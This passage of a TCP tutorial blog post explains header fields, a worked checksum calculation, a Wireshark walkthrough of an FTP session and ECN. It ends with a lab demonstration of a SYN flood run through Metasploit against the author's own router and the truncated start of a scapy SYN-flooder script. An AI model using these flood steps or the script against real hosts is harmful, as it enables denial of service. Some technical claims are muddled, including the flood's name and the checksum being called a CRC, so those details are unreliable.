+    <p><strong>SYN</strong> - as we already saw, the SYN flag used for starting conversation, in the TCP world the starting session end up always with three TCP segments that send back and forth between two parties, because of that this starting point called <strong>Three Way Handshake</strong>, you will see the three way handshake in every conversion that base on TCP.</p>
+  </li>
+  <li>
+    <p><strong>ACK</strong> - we saw that flag, and if you remember, that flag are resposible for approving that the TCP segment arrived successfully to the other endpoint, but keep in mind that if we get ACK flag activated in the TCP segment it doesn’t mean that the data that arrived doesn’t broken and if you ask what we done with broken data? for that we have the CRC (which is the checksum) and we will see that header as we  move on in this article.</p>
+  </li>
+  <li>
+    <p><strong>FIN</strong> - if you remember in the <strong>Basic TCP Functionality</strong> section we saw the FIN &amp; ACK session, the FIN is responsible for closing some session, so if one side want to end the TCP session he send a FIN + ACK flags, the ACK is for approved that the previous TCP segment arrived and the FIN is to inporm the other endpoint that we wish to end the session, so the other endpoint will respond with ACK to approved that we get the FIN + ACK that we sent and he with also initiate a FIN + ACK message to end the session too, and then the first endpoint will respond with ACK and that it, the session is ending, just like we saw in figure 5.</p>
+  </li>
+  <li>
+    <p><strong>PSH</strong> - This flag is stand for push which mean that we want to push some data to the other endpoint, so, every time that the TCP contain some DATA in the upper layer, you will see this flag in active state. When the other site get this segment with active PSH he knows that there is a data and he transfer it to the application that expect to this data. We will see some example of that PSH as you keep reading.</p>
+  </li>
+  <li>
+    <p><strong>RST</strong> - This flag is stand for reset, we will see this flag when we have some issue in the connection, or when some side of the parties trying to kill the session, basically if the receiver see that flag he shouldn’t send any message further in that session and discard any further message that he received from the other side that related to that session.</p>
+  </li>
+  <li>
+    <p><strong>URG</strong> - This flag stand for urgent, we use this flag to inform the other side that there is some urgent data that must be treatment immediately, there is more header that related to this flag and specified the urgent data.</p>
+  </li>
+</ul>
+
+<p><strong>Window Size</strong> - This header used for to inform the other endpoint that we can to buffer some specific amount of data, as example if we send to the other endpoint Window Size of 20000 byte, the other endpoint knows that we can get 20K of data before we sent to him an ACK on the 20K data. Let’s assume that John sent to Bob TCP segment that contain 20K in the window side header, so Bob knows that he can send no more that 20K to John because John can handle only 20K at the time, so if Bob reach to this value he will stop from sending data until he will get some ACK from John about the data Bob was sent, only after that Bob will keep to send more data. Please remember that this is not mean that if John tels Bob about 20K that Bob immediately send 20K stop until the ACK and send again 20K and stop and so on, it’s just let’s Bob knows that he can only handle 20K at the time. We will see in the examples that after two side synchronize they may send small pieces of data as a start, only after that the amount of data may be grow before some ACK will received.</p>
+
+<p><strong>Checksum</strong> - I think that this header is very cool although this is so old algorithm, this is the way to find an error on the TCP segments, the receiver will check the checksum value against the following calculation, if the value is not the same as the checksum value the TCP segment are discard. The calculation are done as follow:</p>
+<ul>
+  <li>
+    <p><strong>Pseudo Header</strong> which is some headers from the IP packets that are include in the checksum calculation. The header are the <strong>Source address</strong> and <strong>destination address</strong> from the IP packet with <strong>Reserved</strong> filed of 8 bit and <strong>Protocol Type</strong> from IP packet which always be 6 because of the TCP, and <strong>TCP Segment Length</strong>.
+<img src="/assets/images/pseudo.png" alt="pseudo" title="Pseudo" class="img-responsive" height="3000px" />
+<strong>Figure 10</strong> Pseudo Header.</p>
+  </li>
+  <li><strong>Source Port</strong> from the TCP segment.</li>
+  <li><strong>Destination Port</strong> from the TCP segment.</li>
+  <li><strong>Sequence number</strong></li>
+  <li><strong>Acknowledgement number</strong></li>
+  <li><strong>Data Offset</strong> as we discussed, it also called TCP header length</li>
+  <li><strong>Reserved</strong> field from the TCP segment</li>
+  <li><strong>Flags</strong> bits.</li>
+  <li><strong>Window Size</strong></li>
+  <li><strong>Option</strong> we will discuss this field later in the article.</li>
+</ul>
+
+<p><img src="/assets/images/checksum.png" alt="checksum" title="checksum" class="img-responsive" height="1000px" width="2000px" />
+  <strong>Figure 11</strong> TCP header for checksum calculation.</p>
+
+<p>After that we take the all field and add it together, the score need to be in length of 4 digits, and after we put all together we calculate the opposite of what we get, in HEX the calculation will be 15 - n = x, the <code class="highlighter-rouge">x</code> is the new number we need. We can also calculated as following:</p>
+<ul>
+  <li>converted the Hex value to binary.</li>
+  <li>change every bit to the opposite which mean <code class="highlighter-rouge">0</code> become <code class="highlighter-rouge">1</code> and <code class="highlighter-rouge">1</code> become <code class="highlighter-rouge">0</code>.</li>
+</ul>
+
+<p>after the calculation, the value we get in the result this is the checksum value.</p>
+
+<p>let’s do real check for example:
+  <img src="/assets/images/checksum2.png" alt="checksum2" title="checksum2" class="img-responsive" height="1000px" width="2000px" />
+  <strong>Figure 12</strong> Checksum calculation using Wireshark.</p>
+
+<p>As you can see the packet that I chose is from some session between my default getaway to one of my hosts. The checksum number is <code class="highlighter-rouge">0x2aa1</code>, so let’s check it our self and find the if the checksum we get is the same checksum we calculate.</p>
+
+<p>So we need to calculate the pseudo, the source address is 10.0.0.138 which in Hex is <code class="highlighter-rouge">0a00</code> and <code class="highlighter-rouge">008a</code>, the destination address is 10.0.0.6 which is <code class="highlighter-rouge">0a00</code> and <code class="highlighter-rouge">0006</code> now we have 8 reserved bit which in Hex is <strong>00</strong> and the protocol type is also 8 bit so we have <strong>06</strong> and together it’s <code class="highlighter-rouge">0006</code>, after that we have TCP segment length in my case it’s 32 bytes so convert that decimal it to Hex we get 20 so we will treat it as <code class="highlighter-rouge">0020</code>.
+The source port is 40991 which is <code class="highlighter-rouge">a01f</code> and the destination port is 2869 in Hex is <code class="highlighter-rouge">0b35</code>, the sequence number <code class="highlighter-rouge">6d11</code>, <code class="highlighter-rouge">6aff</code>, and the acknowledge number is <code class="highlighter-rouge">2c1e</code> <code class="highlighter-rouge">a2dc</code>, the data offset, reserved and flags together is <code class="highlighter-rouge">8010</code>, the window size is <code class="highlighter-rouge">05b4</code> and Option is <code class="highlighter-rouge">0101</code>, <code class="highlighter-rouge">080a</code>, <code class="highlighter-rouge">024c</code>, <code class="highlighter-rouge">cebf</code>, <code class="highlighter-rouge">006a</code>, <code class="highlighter-rouge">0e03</code>.</p>
+
+<p>Now lets calculate all together:</p>
+
+<p><code class="highlighter-rouge">0a00 + 008a + 0a00 + 0006 + 0006 + 0020 + a01f + 0b35 + 6d11 + 6aff + 2c1e + a2dc + 8010 + 05b4 + 0101 + 080a + 024c + cebf + 006a + 0e03 = 3D55B</code></p>
+
+<p>Remember the score is always 4 digits so let’s calculate:</p>
+
+<p><code class="highlighter-rouge">0003 + D55B = D55E</code></p>
+
+<p>Now let’s calculate what is the opposite number of <strong>D55E</strong>, we can to that in binary as follow:<br />
+<code class="highlighter-rouge">1101 0101 0101 1110</code><br />
+<code class="highlighter-rouge">-------------------</code><br />
+<code class="highlighter-rouge">0010 1010 1010 0001</code>
+In Hex is <strong>2AA1</strong>.
+We also can to the following calculation:<br />
+15 - e = 1<br />
+15 - 5 = a<br />
+15 - 5 = a<br />
+15 - d = 2<br /></p>
+
+<p>Remember what was the checksum?? yes! <code class="highlighter-rouge">0x2aa1</code> so the checksum test for this segment pass successfully!</p>
+
+<p><strong>Urgent Pointer</strong> - We will see the urgent pointer when the URG flag is active, as I mentioned earlier when one of the sides sent urgent message in that filed we specified what is the length of the urgent data from the start point of the data field. As example let’s open FTP connection to transfer some file, I using 3cdeamon for the FTP server in one of my hosts, and on anouther host I using CMD.</p>
+
+<p>In one PC I opened CMD and type <code class="highlighter-rouge">ftp</code>, <code class="highlighter-rouge">open 10.0.0.9</code> and type my user and password and start to copy to my host the test.mp3.</p>
+
+<p><img src="/assets/images/ftp.png" alt="ftp" title="ftp" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 13</strong> opening FTP session in command line.</p>
+
+<p>After the transfer as start I killed it with <code class="highlighter-rouge">ctrl+c</code> which is activate the <strong>URG</strong> flag.</p>
+
+<p><img src="/assets/images/ftp5.png" alt="ftp5" title="ftp5" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 14</strong> Killing the FTP session.</p>
+
+<p>On the other PC you can see that the session has being stopped.</p>
+
+<p><img src="/assets/images/ftp2.png" alt="ftp2" title="ftp2" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 15</strong> FTP session has stopped.</p>
+
+<p>Now, if we look on the captured file we will see some frame that contain in the TCP segment a URG flag (I have done some filtering so this is why you see only one packet).</p>
+
+<p><img src="/assets/images/ftp3.png" alt="ftp3" title="ftp3" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 15</strong> FTP session has stopped.</p>
+
+<p>As you can see URG flag is set, if we look at the data we can find a Hex of <code class="highlighter-rouge">0xF2</code> which is in decimal 242 which is the DATA MARK that specified by <a href="https://tools.ietf.org/html/rfc854">RFC 854</a> and it’s the <strong>TCP Urgent notification</strong>.</p>
+
+<p><img src="/assets/images/ftp4.png" alt="ftp4" title="ftp4" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 16</strong> TCP Urgent notification.</p>
+
+<p><strong>Option</strong> - This field contain more optional stuff, that mean the we will see that field typically in the synchronization of two parties, we going to see the real important field in the Option header but ceep in mind that there is more stuff going on.</p>
+<ul>
+  <li><strong>Maximum Segment Size</strong> - Typically this field is 4 byte length and it responsible to specified the Maximum Segment Size or more shortly MMS which is the length of the data payload. We will see that MSS typically in the three way handshake, when some site of the parties get this value he knows that the other side can handle and process maximum of data size as specified in the value of the MSS header, as example if John sent to Bob MSS of 1460, Bob knows that in every message that he send to John he can send only up to 1460 byte in each TCP segment.</li>
+  <li><strong>SACK-permitted</strong> - This is short for <strong>Selective ACKknowledgment</strong>, this field is responsible for case of lost data in the TCP connections, if we lost some packets we will announce to the other endpoint of the lost by the SACK field. In the three way handshake we will see that the two side agree to use SACK if they support it. if you want to know exactly what going on in the SACK filed please refer to <a href="http://packetlife.net/blog/2010/jun/17/tcp-selective-acknowledgments-sack/">this link</a>.</li>
+  <li><strong>Timestamps</strong> - This field are responsible for two value <strong>TSval</strong> which is Timestamp Value field and is contain the clock value of the timestamp of the TCP that going to be send to the other endpoint. The <strong>TSecr</strong> which stand for Timestamp Echo Reply field is only valid when ACK flag is set and it’s echo the TSval value we get from the other endpoint, the propose for timestamps is to taking time measurements. You can read more about the if <a href="https://tools.ietf.org/html/rfc7323#section-3">RFC 7323</a></li>
+  <li><strong>Window Scale</strong> - This option is used to increase the maximum window size,
+  as you remember the window size value is the way that one side tells to the other what it the maximum byte size that he can handle before we get ACK from him, the Window Scale allow us to increase the window size up to 1 gigabyte if it posible or to decrease the window size value if some congestion had being sense. You can read more about it in <a href="https://tools.ietf.org/html/rfc1323#section-2">RFC 1323</a></li>
+</ul>
+
+<p><strong>Data</strong> - This is the actual payload in the TCP segment, this is the data thet one side want to transfer to the other endpoint.</p>
+
+<p><strong>Summary</strong>
+The TCP segment structure can be complex to understanding but if you get down to the real detail you will get it, I guarantee you!</p>
+
+<p>Let’s check what really going on in the realty with some real session.</p>
+
+<h3 id="tcp-session-in-real-world">TCP session in real world.</h3>
+
+<p>In this section I’ll demonstrate how things are really going on, I have two endpoint so let’s called theme John and Bob. I’m going to use Wireshark and we going to open FTP connection between the two, just remember that FTP session works with two ports, 21 for control session and 20 for data session.</p>
+
+<p>If you want you can downloads the session <a href="/assets/downloads/FTP session with ports 21 and 20.pcapng">here</a>.</p>
+
+<p>So John IP address is 10.0.0.8 and Bob IP address is 10.0.0.5, John want to connect Bob and copy from Bob to his machine some file named test.zip (you can actualy download that file from the sniffer captured file LOL).</p>
+
+<p><img src="/assets/images/cap1.png" alt="cap1" title="cap1" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 17</strong> John and Bob.</p>
+
+<p>John send the first TCP segment to synchronize with Bob, you can see that the source port is 49738 and the destination port is 21 which is the FTP service for control connection, the sequence number is 0 because we doesn’t ever sent any data and the acknowledgement number is 0 also. At the flag area you can see a SYN activated which mean that John want to start the three way handshake for TCP base connection, the window size value is 8192 which mean that John tells Bob he can handle only 8k at the same time we will see how that goes on the session.</p>
+
+<p><img src="/assets/images/cap2.png" alt="cap2" title="cap2" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 18</strong> Wireshark connection - TCP ports 21 and 20</p>
+
+<p>The checksum is looking good so it’s great (you can do the calculation the I show you earlier), in the urgent point the value is 0 becouse we have no urgent data at this moment.</p>
+
+<p>If you expand the option area you will see some value like the MSS that set on 1460 byte which mean that John is willing to get TCP segment data with the maximum of 1460 byte per segment.</p>
+
+<p>So the starting session look as follow:</p>
+
+<p><img src="/assets/images/cap3.png" alt="cap3" title="cap3" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 19</strong> First SYN - Three Way Handshake</p>
+
+<p>Please remember that because the SYN flag is active this is why we have the 1 phantom bit, so Bob will count it on his response.</p>
+
+<p>Now Bob going to respond with SYN + ACK flag active and in the acknowledgement number he will specifies <code class="highlighter-rouge">1</code> because he get sequence of 0 and data of 1 which is the phantom byte, on the sequence number he will specifies <code class="highlighter-rouge">0</code>.</p>
+
+<p><img src="/assets/images/cap4.png" alt="cap4" title="cap4" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 20</strong> Second SYN with ACK - Three Way Handshake</p>
+
+<p>Let’s look on the captured file, we can see the source port is 21 and the destination is 49738 and the ACK is set to 1 as we expected, Bob activated the SYN and ACK flags and the window size value is also 8K like John, but as you can see the checksum is bed, it should be <code class="highlighter-rouge">0x442e</code> but it’s <code class="highlighter-rouge">0x1433</code>,</p>
+
+<p><img src="/assets/images/cap5.png" alt="cap5" title="cap5" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 20</strong> Wireshark second SYN with ACK</p>
+
+<p>This is happens because of TCP checksum offload, please notice that this error occurs only when Bob packets, well this is because the capture file was taken from Bob machine, so throughout the conversation you will see such an errors only from Bob.</p>
+
+<p>The key here is that this happens for packets transmitted by the machine doing the capture, not packets received by the machine doing the capture.</p>
+
+<p>When transmitting a segment the OS fills out every field in the TCP segment in the memory, the checksum field is not computed by the OS, it contains whatever data there was before in that memory location.When we capture with Wireshark, it’s capture the contents of this memory location which contains a TCP segment without a computed checksum it’s have a random data. When the OS sends the segment to the NIC, the NIC hardware then performs the checksum computation, and puts the computed checksum to the particular TCP segment field. This checksum is never seen by the OS or Wireshark. So this is the reason for the errors.</p>
+
+<p>If you wanna check yourself, just go to this <a href="https://wiki.wireshark.org/TCP_Checksum_Verification">link</a>, you also can remove the TCP check by Wireshark to ignore such an error.</p>
+
+<p>Let’s go to the next step in the three way handshake, now John going to approved that he get the TCP segment from Bob and this is close up the TCP three way handshake.</p>
+
+<p><img src="/assets/images/cap6.png" alt="cap6" title="cap6" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 21</strong> Last ACK - Three Way Handshake</p>
+
+<p>As you can see the ACK is equal to <code class="highlighter-rouge">1</code> because John get sequence number of <code class="highlighter-rouge">0</code> and <code class="highlighter-rouge">1</code> phantom byte that count as data, the sequence number now is equal to <code class="highlighter-rouge">1</code> as well because John sent in the passed sequence number of <code class="highlighter-rouge">0</code> plus some <code class="highlighter-rouge">1</code> phantom byte.</p>
+
+<p><img src="/assets/images/cap7.png" alt="cap7" title="cap7" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 22</strong> Wireshark last ACK</p>
+
+<p>The session continue with Bob PSH and ACK flags which tells us that on the TCP payload we will find some data that related to FTP (which in our case Bob tell to John that the service are ready for new user). Meanwhile John get login screen so he need to type some user name.
+<img src="/assets/images/cap8.png" alt="cap8" title="cap8" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 23</strong> Login screen.</p>
+
+<p>Please notice that Bob sent to John TCP segment with SEQ that equal to 1 and data bytes size of 42.</p>
+
+<p>John PC respond with ACK about the data that arravied and send another TCP segment that contain a ACK and PSH with data that contain the username guy.
+<img src="/assets/images/cap9.png" alt="cap9" title="cap9" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 24</strong> ACK and PSH with username.</p>
+
+<p>As you can see the acknowledgement number from John is 43 because the received sequence number is 1 plus the received data in byte is 42, the sequence number however remains the same because John sent sequence number of 1 and data of 0.</p>
+
+<p><img src="/assets/images/cap10.png" alt="cap10" title="cap10" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 25</strong> Sequence and acknowledgement.</p>
+
+<p>Now Bob response with SYN and PSH active, the ACK is 11 because the received data was 10 and the received sequence was 1, Bob sequence number is 43 related to the sequence number that was sent before bluse the data that was 0.</p>
+
+<p><img src="/assets/images/cap11.png" alt="cap11" title="cap11" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 26</strong> Bob respond again.</p>
+
+<p>John response with sequence of 11 because he already sent sequence of 1 and 10 data bytes, the acknowledgement number is 76 because John got a data bytes of 33 and sequence number of 43.</p>
+
+<p><img src="/assets/images/cap12.png" alt="cap12" title="cap12" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 27</strong> Sequence of 11 and acknowledgement of 76.</p>
+
+<p>John send more TCP segment with the same values but with data bytes of 13 with password for the FTP session, please note that this is why FTP isn’t secure, the password pass over the net in clear text form.</p>
+
+<p><img src="/assets/images/cap14.png" alt="cap14" title="cap14" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 28</strong> FTP password in clear text.</p>
+
+<p>Please remember that this time John send again data so is a PSH plus ACK.</p>
+
+<p><img src="/assets/images/cap13.png" alt="cap13" title="cap13" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 28</strong> TCP session continue.</p>
+
+<p>The acknowledgement and sequence numbers calculate again and Bob send this time ACK of 11 and SEQ of 76, the data bytes are 20 and Bob actually approved that John log in and in the flags are PSH and ACK.</p>
+
+<p><img src="/assets/images/cap15.png" alt="cap15" title="cap15" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 29</strong> Bob respond again.</p>
+
+<p>The acknowledgement that John specifies is 96 and the sequence is 24, this is just ACK so there is no data in this TCP segment. the other packet contain some data in upper layer.</p>
+
+<p><img src="/assets/images/cap16.png" alt="cap16" title="cap16" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 30</strong> Two TCP segments from John.</p>
+
+<p>So the session will go in that way, just remember the rules we saw earlier:</p>
+<ul>
+  <li>The sequence number is the number of <strong>previously sent data</strong> plus the <strong>previously sent sequence number</strong> to the other endpoint.</li>
+  <li>The acknowledgement number is the number of the <strong>received data</strong> plus the <strong>received sequence number</strong> we get from the other endpoint.</li>
+</ul>
+
+<p>If we make some TCP session that pass through big amount of data we will see the window size and the window scale in action.</p>
+
+<p>As the session continue you will see the test.zip file transfer to John from Bob, for now I want to jump ahead to packet number 436. In this TCP segment we will see the FIN flag in active form from Bob to John, the flags that are active are FIN, PSH and ACK, the TCP payload is 40 bytes, the sequence number is 234 and acknowledgement number is 67.</p>
+
+<p><img src="/assets/images/cap17.png" alt="cap17" title="cap17" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 31</strong> FIN flag.</p>
+
+<p>The follow TCP segment from John contain just ACK and immediately John send also FIN and ACK segment. The first segment contain values of 275 at ACK number because we got sequence of 234 and more data byte of 40 and we also have phantom byte to count because this is the first the FIN flag is active from Bob side. The sequence number is 67 because of packet 435 that contain sequence number of 67 with data of 0 bytes.</p>
+
+<p><img src="/assets/images/cap18.png" alt="cap18" title="cap18" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 32</strong> FIN flag is the phantom this time.</p>
+
+<p>The second packets stay with the same value and the flags as we said are FIN with ACK active.</p>
+
+<p><img src="/assets/images/cap19.png" alt="cap19" title="cap19" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 33</strong> FIN flag is the phantom this time.</p>
+
+<p>Bob respose with ACK and that’s it the session end.</p>
+
+<p><img src="/assets/images/cap20.png" alt="cap20" title="cap20" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 34</strong> The ending ACK.</p>
+
+<p>Let’s look at the diagram to see the numbers in the ending session.</p>
+
+<p><img src="/assets/images/cap21.png" alt="cap21" title="cap21" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 34</strong> TCP ending session.</p>
+
+<p><strong>Summary</strong></p>
+
+<p>The TCP session contain two rules that we saw every time in the sequence and acknowledge number, the three way handshake is the starting point at TCP session that contain 3 TCP segments, the ending session contain 4 TCP segments that contian FIN flag that stand for finish.</p>
+
+<h3 id="the-special-flags">The special flags.</h3>
+
+<p>If you remember we talk earlier about three flags that are called Explicit Congestion Notification. In TCP word if the two endpoint sense some congestion in the network which mean some sort of load that cause drop of TCP segments, the endpoint that sense the congestion will send notification to the other endpoint that and and the two endpoint will decrease the traffic by using window scale.
+The problem with that operation is that we always need to resend some packets that was lost during the TCP session. To migrate that issue we use the ECN flags.</p>
+
+<p>So we have three flags as follow:</p>
+<ul>
+  <li>NS - That is the ECN-nonce bit</li>
+  <li>CWR - stand for Congestion Window Reduced, if the endpoint got a ECE flag he will response with CWR flag set to tell the other side that he going to use window scale to decrease the traffic</li>
+  <li>ECE - ECE-Echo, this bit used to update the other side that some congestion occur.</li>
+</ul>
+
+<p>Let’s say that one side send 3 packets to the other side.</p>
+
+<p><img src="/assets/images/cap22.png" alt="cap22" title="cap22" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 35</strong> TCP ending session.</p>
+
+<p>if some congestion was occur the router in the middle discard the packets.</p>
+
+<p><img src="/assets/images/cap23.png" alt="cap23" title="cap23" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 36</strong> TCP ending session.</p>
+
+<p>So the receiver response with ACK that approved only the first arrived TCP segment in our case, and in the SACK filed he specifies the segments that arrived after the first one, in our case it’s segment 3 so the sender knows that the segment 2 is missing and lost during the transport, so the sender will send the segments again.</p>
+
+<p><img src="/assets/images/cap24.png" alt="cap24" title="cap24" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 37</strong> The receiver approved for segment 1 and 3.</p>
+
+<p><img src="/assets/images/cap25.png" alt="cap25" title="cap25" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 38</strong> The receiver resend segment 2.</p>
+
+<p>However if the router in the middle support in ECN he will set the ECN flags in the IP packets, this flags is part of DSCP (DiffServ) that used for Quality Of Service. You may ask why the flags set in the IP packet and not in the TCP segment, so please remember that the router working at most at layer 3 and doesn’t open the packets to see the TCP segment, so the flags set must be done in layer 3, so we have two bits that are called ECN-Capable Transport as follow:</p>
+
+<p><img src="/assets/images/cap26.png" alt="cap26" title="cap26" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 39</strong> IP packets headers.</p>
+
+<ul>
+  <li>Not-ECT - If the two bits are 0’s this mean that there is no support in ECN.</li>
+  <li>ECT - If the one of the bits are 1 this mean that there is support in ECN.</li>
+  <li>CE - If both bits set to 1 it’s mean that congestion occur.</li>
+</ul>
+
+<p><img src="/assets/images/cap27.png" alt="cap27" title="cap27" class="img-responsive" height="1000px" width="2000px" />
+ <strong>Figure 40</strong> ECN bits.</p>
+
+<p>To summaries all thing together let’s look what really happens when congestion occur:</p>
+<ul>
+  <li>The sender send some packets to the other endpoint with ECN Capable set in IP packets .</li>
+</ul>
+
+<p><img src="/assets/images/cap28.png" alt="cap28" title="cap28" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 41</strong> ECN capable.</p>
+
+<ul>
+  <li>An ECN-capable router detects impending congestion, is usual case the router will start to drop packets, but in our case the router that an ECT codepoint is set in the packet so instead of dropping the packet, the router chooses to set the CE codepoint in the IP header and forwards the packet.</li>
+</ul>
+
+<p><img src="/assets/images/cap29.png" alt="cap29" title="cap29" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 42</strong> The router inform about the congestion.</p>
+
+<ul>
+  <li>The receiver receives the packet with the CE codepoint set, and sets the ECN-Echo flag in its next TCP ACK sent to the sender.</li>
+</ul>
+
+<p><img src="/assets/images/cap30.png" alt="cap30" title="cap30" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 43</strong> ECN-Echo flag is set.</p>
+
+<ul>
+  <li>The sender receives the TCP ACK with ECN-Echo set, and reacts to the congestion as if a packet had been dropped. that mean he will decrease the window size during the session.</li>
+</ul>
+
+<p><img src="/assets/images/cap31.png" alt="cap31" title="cap31" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 44</strong> The sender going to decrease the  window size.</p>
+
+<ul>
+  <li>So the sender sets the CWR flag in the TCP header of the next packet sent to the receiver to acknowledge its receipt of and reaction to the ECN-Echo flag.</li>
+</ul>
+
+<p>In some special cases the the ECN flags in the IP packets can be override by unmarked or mark some value in the DiffServ through the way of packet traveling, so in that case the using of ECN-nonce is coming in, it enables the receiver to demonstrate to the sender that segments being acknowledged were received unmarked. The sender then can verify the nonce sum returned by the receiver to ensure that congestion indications in the form of marked (or dropped) packets are not being concealed</p>
+
+<p>So this leave us with 3 bits reserved and 9 bits used for flags in TCP segment.</p>
+
+<p><img src="/assets/images/cap32.png" alt="cap32" title="cap32" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 45</strong> Reserved and flags.</p>
+
+<p><strong>summary</strong></p>
+
+<p>The ECN bits used with some related bit from IP packets and their goal is to notify about congestion that occur in the network and decrement the window size value.</p>
+
+<h3 id="tcp-attacks">TCP attacks.</h3>
+
+<p>OK guys, if you read so far, you have pritty good knowledge about the TCP session. Now it’s time to start to game with the coolest stuff, there are some attacks that look like deny of service and some of them are focus of disrupting some exist TCP session.</p>
+
+<p><strong>TCP SYN/ACK Flood Attack</strong> - in this attack we will flood our victim with SYN/ACK requesting for initiate a session but we never done the three way handshake which mean that the victim holds these session open and awaiting the final packet in the sequence so it fill up the available connections and denies any requesting clients access.</p>
+
+<p>To perform this attack I’m going to use msfconsole in my Linux Kali distribution, on the terminal type <code class="highlighter-rouge">msfconsole</code> and Metasploit Framework will open. After the msfconsole will open type <code class="highlighter-rouge">use auxiliary/dos/tcp/synflood</code></p>
+
+<p><img src="/assets/images/kali1.png" alt="kali1" title="kali1" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 46</strong> Metasploit Framework.</p>
+
+<p>To see the options we have just type <code class="highlighter-rouge">show options</code>, we will setup the RHOST which is the ip address of our victim and we use port 80 as default.</p>
+
+<p><img src="/assets/images/kali2.png" alt="kali2" title="kali2" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 47</strong> rhost.</p>
+
+<p>The attack will going to be on 10.0.0.138 port 80 which is the http service. To initiate the attack we only need to type <code class="highlighter-rouge">exploit</code> and hit enter.</p>
+
+<p><img src="/assets/images/kali3.png" alt="kali3" title="kali3" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 48</strong> exploit.</p>
+
+<p>now if I trying to get to my router at http service I will not be able to connect and I will get an error after long time.</p>
+
+<p><img src="/assets/images/connecting_error.png" alt="connecting_error" title="connecting_error" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 49</strong> HTTP connecting error.</p>
+
+<p>tcp.flags.ack == 1</p>
+
+<p>I opened Wireshark and I saw many TCP segment that contain only SYN flag in active form.</p>
+
+<p><img src="/assets/images/wireshark_sniffing_with_SYN.png" alt="wireshark_sniffing_with_SYN" title="SYN flag" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 50</strong> Wireshark sniffing with SYN.</p>
+
+<p>I done the same attack but now I setup my source IP, if you doesnt set the source IP it will be randomize, My filter is <code class="highlighter-rouge">tcp.flags.ack == 1 || tcp.flags.syn == 1</code> and we can see the SYN and ACK session between my DG and my Kali host.</p>
+
+<p><img src="/assets/images/kali4.png" alt="kali4" title="kali4" class="img-responsive" height="1000px" width="2000px" />
+<strong>Figure 51</strong> More sniffing.</p>
+
+<p>To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
+<span class="c">#########################################</span>
+<span class="c">#</span>
+<span class="c"># SYNflood - A multithreaded SYN Flooder</span>
+<span class="c"># author: arthurnn</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#########################################</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">threading</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+	<span class="k">print</span> <span class="s">"Usage: </span><span class="si">%</span><span class="s">s &lt;Target IP&gt; &lt;Port&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+
+<span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">conf</span><span class="o">.</span><span class="n">iface</span><span class="o">=</span><span class="s">'en1'</span><span class="p">;</span><span class="c">#network card XD</span>
+
+<span class="k">class</span> <span class="nc">sendSYN</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">target</span><span class="p">,</span> <span class="n">port</span>
+	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
